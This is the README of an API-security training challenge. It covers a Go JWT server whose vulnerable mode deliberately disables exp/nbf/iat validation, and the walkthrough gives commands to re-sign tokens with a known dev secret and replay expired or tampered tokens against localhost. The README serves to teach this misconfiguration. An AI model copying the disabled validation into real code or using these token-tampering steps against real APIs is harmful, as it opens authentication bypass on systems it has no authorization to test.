# JWT Timestamp Tampering

This challenge demonstrates an API that checks a JWT's signature correctly but has claims validation (`exp`, `nbf`, `iat`, ...) explicitly turned off - a real misconfiguration footgun available in most JWT libraries (here, `jwt.WithoutClaimsValidation()` in `golang-jwt/jwt`). A valid signature only proves who signed the token at some point in time; it says nothing about whether that token is still supposed to be usable *now*. With claims validation disabled, a token that is already expired by its own `exp` claim - or one re-signed with `exp` pushed arbitrarily far into the future, `nbf` removed, or `iat` backdated - is accepted exactly like a token freshly issued moments ago.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: exp/nbf/iat are never checked once the signature is valid
go run main.go serve --vulnerable=true

# fixed: the default parser enforces exp/nbf/iat as usual
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a legitimate, freshly-issued token and confirm the happy path
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/session -H "Authorization: Bearer $TOKEN"
# -> 204 No Content

# The signing key is a known dev secret, so the token's claims can be
# tampered with and re-signed. jwtop's weak-secret cracker recovers it from
# a short wordlist, and its timestamp-tampering exploits do the re-signing:
jwtop exploit extendexp "$TOKEN" --secret s3cr3t-dev-key --extension 87600h
jwtop exploit backdateiat "$TOKEN" --secret s3cr3t-dev-key --offset 720h
jwtop exploit clearnbf "$TOKEN" --secret s3cr3t-dev-key

# Replay the already-expired original token, or any of the re-signed
# variants above, against the vulnerable server - all are accepted (204)
# even though a correct implementation enforcing exp would reject them (401)
curl -s -o /dev/null -w '%{http_code}\n' \
  http://localhost:8080/session -H "Authorization: Bearer <token>"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
